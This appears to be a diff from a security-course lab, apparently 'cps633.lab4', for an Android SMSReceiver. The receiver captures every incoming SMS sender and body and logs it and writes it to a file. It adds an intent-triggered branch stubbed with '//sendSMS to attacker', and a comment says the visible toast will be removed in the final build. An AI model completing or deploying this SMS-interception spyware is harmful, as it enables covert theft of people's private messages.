@@ -16,6 +16,8 @@ import java.io.IOException;
 /* Class used to listen for incoming SMS Messages */
 public class SMSReceiver extends BroadcastReceiver{
 
+    private final String smsIntent = "cps633.lab4";
+
     // Get the object of SmsManager
     final SmsManager sms = SmsManager.getDefault();
     String senderNum;
@@ -23,15 +25,22 @@ public class SMSReceiver extends BroadcastReceiver{
 
     public void onReceive(Context context, Intent intent) {
 
-        // Retrieves a map of extended data from the intent.
-        final Bundle bundle = intent.getExtras();
+        String action = intent.getAction();
 
-        try {
-            if (bundle != null) {
-                //pdus = Protocol Description Unit. Used by SMS btw.
+        if(smsIntent.equals(action)){
+            //sendSMS to attacker
+        }
 
-                //Why cast bundle.get as Object[] you say?
-                //Well:
+        else if(1==1) {
+            // Retrieves a map of extended data from the intent.
+            final Bundle bundle = intent.getExtras();
+
+            try {
+                if (bundle != null) {
+                    //pdus = Protocol Description Unit. Used by SMS btw.
+
+                    //Why cast bundle.get as Object[] you say?
+                    //Well:
 
                 /*
                     A PDU is a "protocol description unit", which is the industry format for an SMS message.
@@ -39,33 +48,34 @@ public class SMSReceiver extends BroadcastReceiver{
                     A large message might be broken into many, which is why it is an array of objects.
                  */
 
-                final Object[] pdusObj = (Object[]) bundle.get("pdus");
+                    final Object[] pdusObj = (Object[]) bundle.get("pdus");
 
-                for (Object aPdusObj : pdusObj) {
+                    for (Object aPdusObj : pdusObj) {
 
-                    SmsMessage currentMessage;
-                    currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
+                        SmsMessage currentMessage;
+                        currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
 
-                    senderNum = currentMessage.getDisplayOriginatingAddress(); //get sendernum
-                    message = currentMessage.getDisplayMessageBody(); //get msg
+                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get sendernum
+                        message = currentMessage.getDisplayMessageBody(); //get msg
 
-                    Log.d("SmsReceiver", "senderNum: " + senderNum + "; message: " + message);
+                        Log.d("SmsReceiver", "senderNum: " + senderNum + "; message: " + message);
 
-                    String data = "Sender Num: " + senderNum + " Message: " + message;
+                        String data = "Sender Num: " + senderNum + " Message: " + message;
 
-                    writeToFile(data, context, senderNum, message);
+                        writeToFile(data, context, senderNum, message);
 
-                    // SHOW DA TOAST
-                    int duration = Toast.LENGTH_LONG;
-                    Toast toast = Toast.makeText(context,
-                            "senderNum: " + senderNum + ", message: " + message, duration);
-                    //This will be gone in the final build
-                    toast.show();
+                        // SHOW DA TOAST
+                        int duration = Toast.LENGTH_LONG;
+                        Toast toast = Toast.makeText(context,
+                                "senderNum: " + senderNum + ", message: " + message, duration);
+                        //This will be gone in the final build
+                        toast.show();
+                    }
                 }
-            }
 
-        } catch (Exception e) {
-            Log.e("SmsReceiver", "Exception smsReceiver" + e);
+            } catch (Exception e) {
+                Log.e("SmsReceiver", "Exception  smsReceiver" + e);
+            }
         }
     }
 
